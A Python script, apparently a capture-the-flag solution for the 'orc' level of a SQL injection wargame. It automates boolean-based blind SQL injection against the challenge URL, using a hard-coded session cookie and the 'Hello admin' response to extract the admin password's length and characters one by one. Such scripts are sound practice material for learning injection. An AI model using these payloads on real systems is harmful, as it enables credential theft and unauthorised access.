import urllib
import requests

url = "http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
session = dict(PHPSESSID="oq28ofq8rpnsplo6ebu3em7p84")

flag=""
length=0

print("[*] start")

print("[*] Find password's length")

for i in range(0,20):
	try:
		query=url+"1'or id='admin'and length(pw)="+str(i)+"%23"
		r=requests.post(query,cookies=session)

	except:
		print("[*] exception")
		continue

	if 'Hello admin' in r.text:
		length=i
		break

print("[*] password length: ",length)

print("[*] Find password")

for j in range(1,length+1):
	for i in range(48,128):
		try:
			query=url+"1'or id='admin' and substr(pw,"+str(j)+",1)='"+chr(i)
			r=requests.post(query,cookies=session)
		except:
			print("[*] exception")
			continue

		if "Hello admin" in r.text:
			flag+=chr(i)


			print("[*] found: "+str(j),":",flag)
			break

print("[*] password : "+flag)

print("[*] end")
